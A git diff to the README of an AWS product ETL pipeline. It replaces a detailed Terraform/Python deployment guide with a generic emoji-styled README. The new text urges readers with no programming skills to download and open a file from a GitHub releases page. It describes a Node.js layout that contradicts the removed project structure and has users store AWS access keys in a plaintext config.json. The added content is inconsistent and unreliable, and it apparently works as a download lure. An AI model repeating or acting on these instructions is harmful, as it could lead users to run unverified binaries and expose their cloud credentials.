@@ -1,338 +1,114 @@
-# AWS Product ETL Pipeline
+# 🌟 aws-product-etl-pipeline - Easily Manage Your Data Pipeline
 
-A comprehensive data engineering pipeline built with Terraform that extracts product data from DummyJSON API, 
-processes it with AWS Lambda, stores it in S3, and makes it queryable through AWS Glue and Amazon Athena.
+## 🚀 Getting Started
 
-## Architecture Overview
+Welcome to the aws-product-etl-pipeline project! This application helps you extract product data from the DummyJSON API, transform it using AWS Lambda, store it in S3, and query it with Athena. You don’t need programming skills to get started. Follow these steps to download and set up the application easily.
 
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   DummyJSON     │    │   AWS Lambda    │    │      S3         │
-│      API        │───▶│   ETL Function  │───▶│    Bucket       │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-                                                        │
-┌─────────────────┐    ┌─────────────────┐             │
-│   Amazon        │◀───│   AWS Glue      │◀────────────┘
-│    Athena       │    │   Crawler       │
-└─────────────────┘    └─────────────────┘
-```
+## 📥 Download
 
-## Features
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-aws--product--etl--pipeline-brightgreen)](https://github.com/Ingmedi2238/aws-product-etl-pipeline/releases)
 
-- **Automated ETL Pipeline**: Extracts 30+ products from DummyJSON API with business transformations
-- **Data Cataloging**: AWS Glue automatically discovers and catalogs data schema
-- **Serverless Analytics**: Query data directly from S3 using Amazon Athena
-- **Infrastructure as Code**: Complete infrastructure provisioned with Terraform
-- **Modular Architecture**: Reusable Terraform modules for easy maintenance
-- **Security Best Practices**: Least privilege IAM roles and secure resource access
-- **Random Naming**: Unique resource names to avoid conflicts
+To get the latest version, visit this page: [Download Here](https://github.com/Ingmedi2238/aws-product-etl-pipeline/releases).
 
-## Project Structure
+## 🛠️ System Requirements
+
+Before downloading, ensure your system meets the following requirements:
+
+- A computer with an internet connection
+- Node.js installed (version 14 or higher)
+- AWS account (to use S3 and Lambda services)
+- Basic knowledge of navigating files on your computer
+
+## 💾 Download & Install
+
+1. Go to the [Releases Page](https://github.com/Ingmedi2238/aws-product-etl-pipeline/releases).
+2. Locate the latest release.
+3. Click on the file to download it.
+4. Open the downloaded file.
+
+If you encounter any issues during the download, ensure that your internet connection is stable and try again.
+
+## ⚙️ Setup Instructions
+
+Once downloaded, follow these steps to set up the pipeline:
+
+1. **Extract Files:**
+   - Locate the downloaded file on your computer.
+   - If it is in a zipped format, right-click it and choose "Extract" or "Unzip."
+
+2. **Install Dependencies:**
+   - Open your terminal or command prompt.
+   - Navigate to the extracted folder using the `cd` command (e.g., `cd path-to-folder`).
+   - Run the command `npm install` to install all required packages.
+
+3. **Configure AWS Credentials:**
+   - Go to your AWS Management Console.
+   - Create an IAM user with permissions for S3 and Lambda.
+   - Obtain your Access Key ID and Secret Access Key.
+   - Create a configuration file named `config.json` in the root folder. Fill it with:
+
+   ```json
+   {
+     "aws_access_key_id": "YOUR_ACCESS_KEY",
+     "aws_secret_access_key": "YOUR_SECRET_KEY",
+     "region": "us-east-1" // or your preferred region
+   }
+   ```
+
+4. **Run the Application:**
+   - In your terminal, execute the command `npm start`.
+   - This command will start the data extraction and transformation process.
+
+5. **Access Your Data:**
+   - After the script finishes, check your S3 bucket for the transformed data.
+   - You can then query this data using Athena.
+
+## 🔍 Features
+
+- **Simple Data Extraction:** Easily pull product data from the DummyJSON API.
+- **Powerful Transformations:** Leverage AWS Lambda to handle data transformations.
+- **Effortless Storage:** Automatically store transformed data in S3.
+- **Query Capability:** Use Athena to run queries on your data in S3.
+- **Infrastructure as Code:** Use Terraform scripts to manage your infrastructure.
+
+## 💬 Troubleshooting
+
+If you face any issues during setup or usage, here are some common fixes:
+
+- **Error: Network Issues:** Ensure that your internet connection is active. If you are behind a firewall, check its settings.
+- **Error: AWS Credentials:** Make sure your Access Key ID and Secret Access Key are correct. Double-check your `config.json` file.
+- **Error: Missing Packages:** If the command `npm install` fails, ensure that Node.js and npm are installed correctly.
+
+Feel free to open an issue on the GitHub repository if you need further assistance.
+
+## 🗂️ File Structure
+
+Understanding the file structure can help you navigate and modify the pipeline:
 
 ```
 aws-product-etl-pipeline/
-├── README.md                   # This file
-├── main.tf                     # Root Terraform configuration
-├── variables.tf                # Input variables
-├── outputs.tf                  # Output values
-├── terraform.tfvars.example    # Example variable values
-├── versions.tf                 # Provider requirements
-├── .gitignore                  # Git ignore rules
-├── 
-├── modules/                    # Terraform modules
-│   ├── s3/                     # S3 buckets
-│   ├── iam/                    # IAM roles and policies
-│   ├── lambda/                 # Lambda function
-│   ├── glue/                   # AWS Glue components
-│   └── athena/                 # Amazon Athena workgroup
-├── 
-├── lambda/
-│   └── etl_function/
-│       ├── lambda_function.py  # Main ETL logic
-│       ├── config.py          # Configuration settings
-│       └── requirements.txt    # Python dependencies
-├── 
-└── scripts/
-    ├── deploy.py              # Deployment script
-    └── destroy.py             # Cleanup script
+├── config.json          // Contains AWS credentials
+├── src/
+│   ├── extract.js       // Script for data extraction
+│   ├── transform.js     // Script for data transformation
+│   └── upload.js        // Script for uploading to S3
+├── package.json         // Lists project dependencies
+└── README.md            // Documentation
 ```
 
-## Prerequisites
+## 🌐 Community and Support
 
-- **AWS CLI** configured with appropriate credentials
-- **Terraform** >= 1.0
-- **Python** 3.11+
-- **PowerShell** (for Windows users)
+Join our community for discussions and updates:
 
-## Quick Start Guide
+- [GitHub Issues Page](https://github.com/Ingmedi2238/aws-product-etl-pipeline/issues)
+- Visit our discussions section to connect with other users and contributors.
 
-### Step 1: Set Up AWS Profile
+## 📜 License
 
-If you don't have AWS CLI configured, set it up:
+This project is licensed under the MIT License. You can use it freely. For more details, see the LICENSE file in the repository.
 
-```bash
-# Install AWS CLI (if not already installed)
-# Windows: Download from AWS website
-# macOS: brew install awscli
-# Linux: sudo apt install awscli
+## 📄 Further Documentation
 
-# Configure your AWS credentials
-aws configure --profile your-profile-name
-```
+For more detailed documentation, examples, and FAQs, please refer to the [Wiki](https://github.com/Ingmedi2238/aws-product-etl-pipeline/wiki) associated with this repository.
 
-Enter your:
-- AWS Access Key ID
-- AWS Secret Access Key 
-- Default region (e.g., `eu-west-1`)
-- Default output format: `json`
-
-Verify your setup:
-```bash
-aws sts get-caller-identity --profile your-profile-name
-```
-
-### Step 2: Clone and Configure
-
-```bash
-# Clone the repository 
-git clone <url-here>
-
-# after
-cd aws-product-etl-pipeline
-
-# Copy and edit configuration
-cp terraform.tfvars.example terraform.tfvars
-```
-
-Edit `terraform.tfvars` with your settings:
-```hcl
-# Project Configuration
-project_name = "shop-etl"
-environment  = "dev"
-
-# AWS Configuration  
-aws_region  = "eu-west-1"              # Your preferred region
-aws_profile = "your-profile-name"      # Your AWS CLI profile
-
-# S3 Configuration (this will have random suffix added)
-s3_bucket_name         = "shop-etl-de-101"
-athena_results_bucket  = "shop-etl-athena-results"
-
-# Lambda Configuration
-lambda_memory_size = 512
-lambda_timeout     = 300
-
-# Glue Configuration
-glue_database_name = "shop_products_db"
-glue_crawler_name  = "shop-products-crawler"
-
-# Athena Configuration
-athena_workgroup_name = "shop-etl-workgroup"
-```
-
-### Step 3: Deploy Infrastructure
-
-```bash
-# Deploy using the deployment script
-python scripts/deploy.py apply
-```
-
-This will:
-1. Initialize Terraform
-2. Create 18 AWS resources:
-   - 2 S3 buckets (with random suffixes)
-   - Lambda function with ETL code
-   - IAM roles and policies
-   - Glue database and crawler
-   - Athena workgroup
-   - CloudWatch log group
-
-**Expected Output:**
-```
-Apply complete! Resources: 18 added, 0 changed, 0 destroyed.
-
-Outputs:
-s3_bucket_name = "shop-etl-de-101-<with-some-prefix>"
-lambda_function_name = "shop-etl-etl-function"
-...
-```
-
-### Step 4: Test the ETL Pipeline
-
-#### 4.1 Run the Lambda Function
-```bash
-# Invoke the ETL function
-aws lambda invoke --function-name shop-etl-etl-function --profile your-profile-name output.json
-
-# Check the results
-cat output.json
-```
-
-**Expected Output:**
-```py
-{
-  statusCode: 200,
-  body: {
-    "message": "...successfully",
-    "records_processed": 30,
-    "s3_key": "products/year=.../month=.../day=.../products_....csv",
-    "execution_time": "2025...T....748402"
-  }
-}
-```
-
-#### 4.2 Run the Glue Crawler
-```bash
-# Start the crawler to catalog the data
-aws glue start-crawler --name shop-products-crawler --profile your-profile-name
-
-# Check crawler status
-aws glue get-crawler --name shop-products-crawler --profile your-profile-name --query "Crawler.State"
-```
-
-Wait until status shows `"READY"` (usually 1-2 minutes). - it might even be less
-
-#### 4.3 Query Data with Athena
-```bash
-# Get your bucket name from Terraform outputs
-terraform output athena_results_bucket_name
-
-# Run a test query
-aws athena start-query-execution \
-  --query-string "SELECT COUNT(*) as total_products FROM shop_products_db.products" \
-  --result-configuration OutputLocation=s3://your-athena-results-bucket/query-results/ \
-  --work-group shop-etl-workgroup \
-  --profile your-profile-name
-```
-
-#### 4.4 Advanced Analytics Query
-```sql
--- Query product categories and pricing
-SELECT 
-    price_category, 
-    COUNT(*) as product_count,
-    AVG(price) as avg_price,
-    AVG(rating) as avg_rating
-FROM shop_products_db.products 
-GROUP BY price_category 
-ORDER BY avg_price;
-```
-
-- you can create your own queries as well
-
-## Understanding the Data Flow
-
-### 1. Data Extraction
-- Lambda function fetches product data from `https://dummyjson.com/products`
-- Retrieves ~30 product records with details like price, rating, stock, etc.
-
-### 2. Data Transformation
-The Lambda function applies business logic:
-- **Price Categories**: Budget (<$50), Mid ($50-$100), Premium ($100-$500), Luxury ($500+)
-- **Rating Categories**: Fair (<4.0), Good (4.0-4.5), Excellent (4.5+)
-- **Stock Status**: Out of Stock (0), Low Stock (<10), In Stock (10+)
-- **Metadata**: Adds processing timestamp, data source, pipeline version
-
-### 3. Data Storage
-- Data stored in S3 with partitioned structure: `products/year=2024/month=9/day=3/`
-- CSV format with headers for easy analysis
-
-### 4. Schema Discovery
-- Glue crawler automatically detects schema and data types
-- Creates table `products` in database `shop_products_db`
-- Supports partitioned querying for performance
-
-### 5. Data Analysis
-- Athena enables SQL queries directly on S3 data
-- No data movement required - query in place
-- Results stored in dedicated S3 bucket
-
-## Monitoring and Troubleshooting
-
-### Check Resource Status
-```bash
-# View all outputs
-terraform output
-
-# Check S3 bucket contents
-aws s3 ls s3://your-bucket-name/products/ --recursive --profile your-profile-name
-
-# Check Glue table schema
-aws glue get-table --database-name shop_products_db --name products --profile your-profile-name
-```
-
-### Common Issues and Solutions
-
-**Issue: Lambda timeout**
-```bash
-# Increase timeout in terraform.tfvars
-lambda_timeout = 600  # 10 minutes
-
-# Redeploy
-python scripts/deploy.py apply
-```
-
-**Issue: S3 permissions error**
-- Check that your AWS profile has S3 permissions
-- Verify the bucket names in outputs
-
-**Issue: Athena query fails**
-- Ensure Glue crawler has completed
-- Check that the table exists: `aws glue get-tables --database-name shop_products_db`
-
-## Clean Up Resources
-
-**IMPORTANT**: This will delete ALL resources and data!
-
-```bash
-# Run the destruction script
-python scripts/destroy.py
-
-# make sure you have the profile set in the script
-# or you can start your profile with the prefix : "aws_profile"
-# so "aws_profile_<your-name>"
-```
-
-The script will:
-1. Empty all S3 buckets (data + query results)
-2. Stop any running Athena queries
-3. Clean up named queries
-4. Destroy all 18 AWS resources with Terraform
-5. Remove local state files
-
-**Expected Output:**
-```
-Complete cleanup finished!
-All AWS resources have been destroyed and local files cleaned up.
-```
-
-## Advanced Usage
-
-### Customizing the ETL Logic
-Edit `lambda/etl_function/lambda_function.py` to:
-- Add new data transformations
-- Change business rules for categorization
-- Add data validation
-- Connect to different APIs
-
-### Scheduling ETL Jobs
-Add EventBridge trigger to run ETL on schedule:
-```hcl
-# Add to lambda module
-resource "aws_cloudwatch_event_rule" "etl_schedule" {
-  name                = "etl-schedule"
-  description         = "Run ETL daily"
-  schedule_expression = "cron(0 2 * * ? *)"
-}
-```
-
-### Adding More Data Sources
-1. Extend the Lambda function
-2. Update IAM permissions
-3. Modify Glue crawler paths
-4. Update Athena queries
-
-## Security Considerations
-
-- **IAM Roles**: Least privilege access patterns
-- **S3 Security**: Block public access enabled
+Feel free to ask questions or contribute to the project. Your input helps make this a better tool for everyone. Happy data processing!
